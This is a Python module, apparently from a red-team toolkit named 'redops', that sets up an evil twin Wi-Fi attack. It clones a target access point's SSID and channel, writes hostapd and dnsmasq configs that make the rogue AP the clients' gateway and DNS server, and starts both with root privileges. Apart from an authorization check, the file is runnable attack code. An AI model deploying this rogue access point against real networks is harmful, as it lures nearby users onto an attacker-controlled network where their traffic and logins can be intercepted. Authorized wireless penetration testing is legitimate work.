"""
Evil twin AP — clones target SSID and starts rogue AP.

Requires: hostapd, dnsmasq, a second network interface (ap_interface).
Root privileges required.
"""

import subprocess
import time
from pathlib import Path
from typing import Any

from redops.core.context import Context
from redops.modules.active.authorization import assert_active_authorized

HOSTAPD_CONF_TEMPLATE = """\
interface={ap_interface}
driver=nl80211
ssid={essid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
"""

DNSMASQ_CONF_TEMPLATE = """\
interface={ap_interface}
dhcp-range=192.168.99.50,192.168.99.150,255.255.255.0,12h
dhcp-option=3,192.168.99.1
dhcp-option=6,192.168.99.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
"""

_HOSTAPD_CONF_PATH = Path("/tmp/redops_hostapd.conf")  # noqa: S108
_DNSMASQ_CONF_PATH = Path("/tmp/redops_dnsmasq.conf")  # noqa: S108


def start_evil_twin(ctx: Context, params: dict[str, Any] | None = None) -> Context:
    """
    Clone target AP and start rogue access point.

    Params:
        target_bssid: BSSID of AP to clone. If None, picks highest signal AP.
        ap_interface: Interface to host AP on. Default: 'wlan0'
        ap_ip: IP to assign AP interface. Default: '192.168.99.1'

    Adds to context:
        evil_twin_active, evil_twin_essid, evil_twin_channel,
        evil_twin_bssid, ap_subnet, captured_clients,
        hostapd_proc, dnsmasq_proc
    """
    assert_active_authorized(ctx)
    params = params or {}
    ap_interface = params.get("ap_interface", "wlan0")
    ap_ip = params.get("ap_ip", "192.168.99.1")
    target_bssid = params.get("target_bssid")

    access_points = ctx.get("access_points", [])
    if not access_points:
        ctx.log("No APs in context. Run scan first.", level="ERROR")
        ctx.add("evil_twin_active", False)
        return ctx

    target = _select_target(access_points, target_bssid)
    essid = target["essid"]
    channel = target["channel"] or "6"

    ctx.log(
        f"Cloning AP: {essid} ({target['bssid']}) ch{channel}",
        level="INFO",
    )

    # Configure AP interface IP
    for cmd in [
        ["sudo", "ip", "addr", "flush", "dev", ap_interface],
        ["sudo", "ip", "addr", "add", f"{ap_ip}/24", "dev", ap_interface],
        ["sudo", "ip", "link", "set", ap_interface, "up"],
    ]:
        subprocess.run(cmd, capture_output=True)  # noqa: S603

    # Write hostapd config
    hostapd_conf = HOSTAPD_CONF_TEMPLATE.format(
        ap_interface=ap_interface,
        essid=essid,
        channel=channel,
    )
    _HOSTAPD_CONF_PATH.write_text(hostapd_conf)

    # Write dnsmasq config
    dnsmasq_conf = DNSMASQ_CONF_TEMPLATE.format(ap_interface=ap_interface)
    _DNSMASQ_CONF_PATH.write_text(dnsmasq_conf)

    # Kill existing dnsmasq
    subprocess.run(
        ["sudo", "pkill", "dnsmasq"],  # noqa: S603, S607
        capture_output=True,
    )

    # Start hostapd
    hostapd_proc = subprocess.Popen(
        ["sudo", "hostapd", str(_HOSTAPD_CONF_PATH)],  # noqa: S603, S607
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(2)

    # Start dnsmasq
    dnsmasq_proc = subprocess.Popen(
        ["sudo", "dnsmasq", "-C", str(_DNSMASQ_CONF_PATH), "--no-daemon"],  # noqa: S603, S607
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    ctx.add("evil_twin_active", True)
    ctx.add("evil_twin_essid", essid)
    ctx.add("evil_twin_channel", channel)
    ctx.add("evil_twin_bssid", target["bssid"])
    ctx.add("hostapd_proc", hostapd_proc)
    ctx.add("dnsmasq_proc", dnsmasq_proc)
    ctx.add("ap_subnet", "192.168.99.0/24")
    ctx.add("captured_clients", [])

    ctx.log(f"Evil twin active: {essid}", level="INFO")
    return ctx


def stop_evil_twin(ctx: Context, params: dict[str, Any] | None = None) -> Context:
    """Teardown evil twin AP. Call in cleanup pipeline."""
    for proc_key in ["hostapd_proc", "dnsmasq_proc"]:
        proc = ctx.get(proc_key)
        if proc:
            proc.terminate()

    subprocess.run(
        ["sudo", "pkill", "hostapd"],  # noqa: S603, S607
        capture_output=True,
    )
    subprocess.run(
        ["sudo", "pkill", "dnsmasq"],  # noqa: S603, S607
        capture_output=True,
    )

    ctx.add("evil_twin_active", False)
    ctx.log("Evil twin stopped", level="INFO")
    return ctx


def _select_target(access_points: list[dict], target_bssid: str | None) -> dict:
    """Select target AP by BSSID or highest signal."""
    if target_bssid:
        for ap in access_points:
            if ap["bssid"] == target_bssid:
                return ap

    return max(
        access_points,
        key=lambda x: int(x["signal"]) if x["signal"].lstrip("-").isdigit() else -100,
    )
